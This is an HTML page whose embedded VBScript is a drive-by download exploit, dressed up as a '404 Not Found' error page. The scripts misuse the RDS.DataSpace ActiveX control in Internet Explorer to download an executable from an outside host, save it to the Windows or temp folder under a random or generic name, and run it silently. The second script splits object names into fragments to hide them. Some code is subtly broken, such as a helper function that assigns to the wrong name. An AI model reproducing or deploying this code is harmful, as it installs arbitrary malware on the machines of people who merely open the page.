

<HTML xmlns:IE>
<body>

<SCRIPT language="VBScript">

Module_Path="http://pynet.info/col/get.php?file=exe"

   If navigator.appName="Microsoft Internet Explorer" Then

      If InStr(navigator.platform,"Win32") <> 0  Then

      Const ssfFONTS=20
      Const adModeReadWrite=3
      Const adTypeBinary=1
      Const adSaveCreateOverWrite=2

      Dim  oRDS
      Dim  oXMLHTTP
      Dim  oFSO
      Dim  oStream
      Dim  oWShell
      Dim  oShellApp

      Dim  WinDir
      Dim  ExeName
      Dim  XMLBody
      Dim  PluginFile
      Dim  cByte
      Dim   ObjName
      Dim   ObjProg

      Randomize

      ExeName=GenerateName()

      ExeName=ExeName & ".exe"

      Set  oRDS=document.createElement("object")
      oRDS.setAttribute "id","oRDS"
      oRDS.setAttribute "classid",GetCsID

      Set oShellApp = oRDS.CreateObject("Shell.Application","")
      Set oFolder = oShellApp.NameSpace(ssfFONTS)
      Set oFolderItem=oFolder.ParseName("Symbol.ttf")
      Font_Path_Components=Split(oFolderItem.Path,"\",-1,1)
      WinDir= Font_Path_Components(0) & "\" &  Font_Path_Components(1) & "\"
      ExeName=WinDir & ExeName

      ObjName="Microsoft"
      ObjProg="XMLHTTP"
      set oXMLHTTP = CreateObject(ObjName & "." & ObjProg)
      Req_type="GET"
      HTTPSession=oXMLHTTP.Open(Req_Type,Module_Path,0)
      oXMLHTTP.Send()
      On Error Resume Next
      XMLBody=oXMLHTTP.responseBody

      On Error Resume Next
      Set oStream=oRDS.CreateObject("ADODB.Stream","")
      If Err.number <> 0 Then

            Set oFSO=oRDS.CreateObject(GetF_S_O(),"")
            Set PluginFile=oFSO.CreateTextFile(ExeName, TRUE)
            Plugin_size=LenB(XMLBody)

            For j=1 To Plugin_size
                cByte=MidB(XMLBody,j,1)
                ByteCode=AscB(cByte)
                PluginFile.Write(Chr(ByteCode))
            Next
            PluginFile.Close

            Set  oWShell=oRDS.CreateObject("WScript.Shell","")
            On Error Resume Next
            oWShell.Run (ExeName),1,FALSE
      Else
            oStream.Mode=adModeReadWrite
            oStream.Type=adTypeBinary
            oStream.Open
            oStream.Write XMLBody
            oStream.SaveToFile ExeName,adSaveCreateOverWrite

            oShellApp.ShellExecute ExeName
      End If


      End If
   End If


Function GetF_S_O()
GetCsID = "Scripting.FileSystemObject" 
End Function


Function GetCsID()
GetCsID = "clsid:BD96C556-65A3-11D0-983A-00C04FC29E36"
End Function


Function GenerateName()
RandomName=""
rr=Int(8*Rnd)
ik=0
Do
  ii=Int(25*Rnd)+97
  RandomName=RandomName+Chr(ii)
  ik=ik+1
Loop While ik<rr
GenerateName=RandomName
End Function

</SCRIPT>

<script language="VBScript">

    on error resume next
    dl = "http://pynet.info/col/get.php?file=exe"
    Set df = document.createElement("object")

    df.setAttribute "classid",GetCsID

    strr1="Mic"
    strr2="roso"
    strr3="ft."
    strr4="XML"
    strr5="HTTP"
    strr=strr1&strr2&strr3&strr4&strr5

    Set x = df.CreateObject(strr,"")

    ab1="A"
    ab2="dod"
    ab3="b.S"
    ab4="t"
    ab5="re"
    ab6="am"
    strb1=ab1&ab2&ab3&ab4&ab5&ab6
    strb5=strb1
    set YY = df.createobject(strb5,"")
    YY.type = 1
    str6="GET"
    x.Open str6, dl, False
    x.Send
    fnamezz1="new.exe"

    set FF = df.createobject(GetF_S_O(),"")
    set tmp = F.GetSpecialFolder(2)
    fnamezz1= FF.BuildPath(tmp,fnamezz1)


    YY.open
    YY.write x.responseBody
    YY.savetofile fnamezz1,2
    YY.close
    set MM = df.createobject("Shell.Application","")
        MM.ShellExecute fnamezz1,"","","open",0
</script>
404 Not Found
</body>
</html>